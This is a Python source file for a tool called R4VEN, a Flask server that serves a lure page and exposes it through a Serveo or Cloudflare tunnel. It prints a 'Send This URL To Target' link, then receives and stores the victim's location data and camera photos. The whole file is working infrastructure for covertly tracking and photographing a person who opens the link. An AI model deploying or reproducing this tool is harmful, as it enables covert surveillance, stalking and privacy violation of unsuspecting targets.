import sys
import requests
import os
import socket
import subprocess
import threading
import logging
import argparse
import re
import time
from flaredantic import FlareTunnel, FlareConfig
from flask import Flask, request, Response, send_from_directory
import signal
from utils import get_file_data   # removed update_webhook/check_and_get_webhook_url
import json

# 🔥 All data (locations/images) will now save into r4ven-server/uploads
UPLOAD_FOLDER = "../r4ven-server/uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Global flag to handle graceful shutdown
shutdown_flag = threading.Event()

HTML_FILE_NAME = "index.html"

# CLI colors
if sys.stdout.isatty():
    R = '\033[31m'  # Red
    G = '\033[32m'  # Green
    C = '\033[36m'  # Cyan
    W = '\033[0m'   # Reset
    Y = '\033[33m'  # Yellow
    M = '\033[35m'  # Magenta
    B = '\033[34m'  # Blue
else:
    R = G = C = W = Y = M = B = ''

app = Flask(__name__)

parser = argparse.ArgumentParser(
    description="R4VEN - Track device location, IP address, and capture a photo with device details.",
    usage=f"{sys.argv[0]} [-t target] [-p port]"
)
parser.add_argument("-t", "--target", nargs="?", help="the target url to send the captured images to", default="http://localhost:8000/image")
parser.add_argument("-p", "--port", nargs="?", help="port to listen on", type=int, default=8000)
args = parser.parse_args()

def should_exclude_line(line):
    exclude_patterns = ["HTTP request"]
    return any(pattern in line for pattern in exclude_patterns)

# ✅ Serve landing page
@app.route("/", methods=["GET"])
def get_website():
    html_data = ""
    try:
        html_data = get_file_data(HTML_FILE_NAME)
    except FileNotFoundError:
        pass
    return Response(html_data, content_type="text/html")

@app.route("/dwebhook.js", methods=["GET"])
def get_webhook_js():
    return send_from_directory(directory=os.getcwd(), path="dwebhook.js")

# ✅ Save location data LOCALLY into r4ven-server/uploads
@app.route("/location_update", methods=["POST"])
def update_location():
    data = request.json
    try:
        with open(os.path.join(UPLOAD_FOLDER, "location_log.json"), "a") as f:
            json.dump(data, f)
            f.write("\n")
        print(f"{G}[+] Location data saved to {UPLOAD_FOLDER}: {data}{W}")
    except Exception as e:
        print(f"{R}[!] Error saving location locally: {e}{W}")
    return "OK"

# ✅ Save image LOCALLY into r4ven-server/uploads
@app.route('/image', methods=['POST'])
def image():
    i = request.files['image']
    filename = ('%s.jpeg' % time.strftime("%Y%m%d-%H%M%S"))
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    i.save(filepath)

    print(f"{G}[+] Image saved locally: {filepath}{W}")
    return Response(f"{filename} saved locally")

@app.route('/get_target', methods=['GET'])
def get_url():
    return args.target

# ✅ Flask server thread handler
def run_flask(folder_name):
    try:
        os.chdir(folder_name)
    except FileNotFoundError:
        print(f"{R}Error: Folder '{folder_name}' does not exist.{W}")
        sys.exit(1)

    flask_thread = threading.Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": args.port, "debug": False})
    flask_thread.daemon = True
    flask_thread.start()

    try:
        while not shutdown_flag.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"{R}Flask server terminated.{W}")
        shutdown_flag.set()

# ✅ CTRL+C exit handler
def signal_handler(sig, frame):
    print(f"{R}Exiting...{W}")
    shutdown_flag.set()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# ✅ Cloudflare tunnel function
def run_tunnel():
    try:
        config = FlareConfig(
            port=args.port,
            verbose=True
        )
        with FlareTunnel(config) as tunnel:
            print(f"{G}[+] Flask app available at: {C}{tunnel.tunnel_url}{W}")
            while not shutdown_flag.is_set():
                time.sleep(0.5)
    except Exception as e:
        logging.error(f"Error in Cloudflare tunnel: {e}")
        print(f"{R}Error: {e}{W}")

# ✅ Serveo.net port forwarding
def start_port_forwarding():
    try:
        command = ["ssh", "-R", f"80:localhost:{args.port}", "serveo.net"]
        logging.info("Starting port forwarding with command: %s", " ".join(command))

        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        url_printed = False
        for line in process.stdout:
            line = line.strip()
            if line:
                if "Forwarding HTTP traffic from" in line and not url_printed:
                    url = line.split(' ')[-1]
                    formatted_url_message = (
                        f"\n{M}[+] {C}Send This URL To Target: {G}{url}{W}\n {R}Don't close this window!{W}")
                    print(formatted_url_message)
                    logging.info(formatted_url_message)
                    url_printed = True
                elif not should_exclude_line(line):
                    logging.info(line)
                    print(line)
        
        for line in process.stderr:
            line = line.strip()
            if line and not should_exclude_line(line):
                logging.error(line)
                print(line)

    except Exception as e:
        print(f"An error occurred while using Serveo: {e}", "error")

# ✅ Check if Serveo is up
def is_serveo_up():
    print(f"\n{B}[?] {C}Checking if {Y}Serveo.net{W} is up for port forwarding...{W}", end="", flush=True)
    try:
        response = requests.get("https://serveo.net", timeout=3)
        if response.status_code == 200:
            print(f" {G}[UP]{W}")
            return True
    except requests.RequestException:
        pass
    print(f" {R}[DOWN]{W}")
    return False

# ✅ Ask user which port forwarding to use
def ask_port_forwarding():
    serveo_status = "Site is Up" if is_serveo_up() else "Down! Currently not working"
    print(f'____________________________________________________________________________\n')
    print(f"{B}[~] {C}Choose port forwarding?{W}\n")
    print(f"{Y}1. {W}serveo ({R}{serveo_status}{W})")
    print(f"{Y}2. {W}cloudflare {G}(recommended)")
    print(f"{Y}3. {W}None, I will use another method")
    print(f"\n{M}Note:{R} If 1,2 does not work..{W}Use option {G}3{W} and port forward manually using tool like Ngrok\n")
    choice = input(f"\n{B}[+] {Y}Enter the number corresponding to your choice: {W}")
    return choice

# ✅ Check if chosen port is available
def is_port_available(port):
    print(f"{B}[?] {C}Checking if port {Y}{port}{W} is available...{W}", end="", flush=True)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        if sock.connect_ex(("127.0.0.1", port)) != 0:
            print(f" {G}[AVAILABLE]{W}")
            return True
        else:
            print(f" {R}[IN USE]{W}")
            return False
